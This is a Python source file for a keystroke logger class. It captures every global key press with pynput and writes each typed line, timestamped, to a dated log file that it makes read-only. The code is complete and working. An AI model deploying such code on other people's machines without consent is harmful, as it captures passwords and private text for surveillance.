from datetime import date, datetime
from logger import Logger
from pathlib import Path
from position import Position
from pynput.keyboard import Key, Listener
import logging
import os


class KeyStrokeLogger:
    """
    This class is used to create an instance of a key stroke logger and log the
    contents typed to a file. 
    """
    
    # A list of all the keys that should not be added to the logger
    __KEY_STROKES_TO_IGNORE = [
        Key.alt,
        Key.backspace,
        Key.caps_lock,
        Key.ctrl,
        Key.down,
        Key.end,
        Key.enter,
        Key.esc,
        Key.home,
        Key.left,
        Key.page_down,
        Key.page_up,
        Key.right,
        Key.shift,
        Key.tab,
        Key.up
    ]
    
    def __init__(self, log_dir) -> None:
        """
        Initialise a key stroke logger object.
        
        Parameters:
            log_dir (str): The directory where the logs should be written to
        """
        self.__key_stroke_logger = Logger()
        self.__log_directory = self.__test_directory(log_dir)
    
    def __file_path(self) -> Path:
        """
        Create the path to the file to write the logs to with the current date.
        
        Returns:
            Path: The path to the file where the logs should be written to
        """
        str_date = str(date.today())
        output_folder = self.__log_directory / "key-stroke-logs"
        output_folder.mkdir(parents=True, exist_ok=True)
        return output_folder / f"key-stroke-logger-{str_date}.log"
    
    def __format_log_line(self) -> str:
        """
        Format the content to write to the log file in a consistent way with the
        current timestamp.
        
        Returns:
            str: The formatted logger content with timestamp
        """
        timestamp = str(datetime.now()).split(".")[0]
        return f"[{timestamp}] {self.__key_stroke_logger.to_string()}\n"
    
    def __on_press(self, key : str) -> None:
        """
        Conditionally adds/removes keystrokes from the logger stream
        
        Parameters:
            key (str): The key that was pressed
        """
        match key:
            case Key.space:
                self.__key_stroke_logger.add(" ")
            case Key.backspace if not self.__key_stroke_logger.is_empty():
                self.__key_stroke_logger.remove(Position.TAIL)
            case key_ if key_ not in self.__KEY_STROKES_TO_IGNORE:
                self.__key_stroke_logger.add(str(key).replace("'", ""))
            case _:
                pass

    def __on_release(self, key : str) -> None:
        """
        Writes the content of the logger stream to a log file and 
        clears the logger on release if the return key is pressed.\n
        The log file is made read-only to prevent tampering of logs.
        
        Parameters:
            key (str): The key that was released
        """
        if key == Key.enter and not self.__key_stroke_logger.is_empty():
            path = self.__file_path()
            # Make the file read-write to be able to write to it
            # This case is for when we want to append to the file
            # as we initially create it and make it read-only
            if os.path.exists(path):
                path.chmod(0o644)
            with open(path, "a") as file:
                file.write(self.__format_log_line())
                self.__key_stroke_logger.clear()
                # Make the file read-only so the logs cannot be modified
                path.chmod(0o444)
                logging.info(f"Wrote log to {path} and cleared the logger")
    
    def __test_directory(self, path : str) -> Path:
        """
        Test if the directory passed exists.\n
        Raises an exception in the case that the path does not exist.
        
        Parameters:
            path (str): The directory whose existence is being tested
        
        Returns:
            Path: The path passed as a string converted to a Path object
        """
        if not os.path.isdir(path):
            raise Exception(f"The directory '{path}' does not exist")
        return Path(path)
    
    def start_logger(self) -> None:  
        """
        Start the key stoke logger server and write the logs to a file
        """
        with Listener(
            on_press=self.__on_press, 
            on_release=self.__on_release
        ) as listener:
            listener.join()